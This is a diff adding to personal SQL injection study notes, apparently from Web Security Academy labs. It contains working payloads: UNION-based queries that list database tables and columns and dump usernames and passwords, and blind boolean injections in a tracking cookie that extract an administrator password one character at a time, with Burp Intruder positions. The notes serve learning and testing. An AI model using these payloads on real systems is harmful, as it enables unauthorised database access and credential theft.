@@ -162,6 +162,30 @@ https://0a6e00490459ba1a80eb5866000a0056.web-security-academy.net/filter?categor
 
 https://0ae40036034b6b0d8575b95b0014005c.web-security-academy.net/filter?category=%27UNION%20SELECT%20NULL,%20username%20||%27~%27||%20password%20FROM%20users--
 # concatenated username and password with ~
+
+GET /filter?category=Accessories'union select table_name,null from information_schema.tables--
+# modified http request in burp suite to get table names
+
+GET /filter?category=Accessories'union select column_name,null from information_schema.columns where table_name='users_kgsxxq'-- HTTP/2
+# modified the http request in burp suite to get columns from a specific table; values showed up in the middle of the content
+
+GET /filter?category=Accessories'union select username_ixtpyy,password_xlduvn from users_kgsxxq-- HTTP/2
+# modify http header to retrieve values from the users and password columns above from specific table
+
+GET / HTTP/2
+Host: 0a9600cf0420fce980b3e0e8005b008a.web-security-academy.net
+Cookie: TrackingId=6nGoAICJu8E09Xhv'+and+(select+username+from+users	where+username%3d'administrator')%3d'administrator'--; session=KCRVz5UFM8CpNzQcEKZ46N2A3lzMgjsU
+# if true, then the user, 'administrator', exists
+
+GET / HTTP/2
+Host: 0a9600cf0420fce980b3e0e8005b008a.web-security-academy.net
+Cookie: TrackingId=6nGoAICJu8E09Xhv'+and+(select+username+from+users+where+username%3d'administrator'+and+LENGTH(password)>19)='administrator'--'; session=KCRVz5UFM8CpNzQcEKZ46N2A3lzMgjsU
+# check for username and password length, use intruder to iterate numbers for you
+
+GET / HTTP/2
+Host: 0a9600cf0420fce980b3e0e8005b008a.web-security-academy.net
+Cookie: TrackingId=6nGoAICJu8E09Xhv'+and+(select+substring(password,§1§,1)+from+users+where+username%3d'administrator')%3d'§a§'--'; session=KCRVz5UFM8CpNzQcEKZ46N2A3lzMgjsU
+# what the positions looks like for intruder
 ```
 
 ### MySQL
@@ -351,6 +375,36 @@ In this case, we appended an IF condition that will always be true inside the st
 This attack angle can clearly become very time consuming, so it's often automated with tools like sqlmap.
 
 **Initially pinpoint the parameter affected by the blind SQL injection through manual examination and only then pass this information to any automated tool such as SQLmap.**
+
+#### Substrings 
+
+For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time. Note that you can use boolean-based SQLi in order to figure out the structure, and get to this point.
+
+You can check if a particular user exists, check for the length of names, and compare values.
+
+To do this, start with the following input:
+
+```bash
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+```
+
+This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.
+
+Next, we send the following input:
+
+```bash
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+```
+
+This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.
+
+Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:
+
+```bash
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+```
+
+You can do this until you have the whole password.
 
 ### Good to Know
 
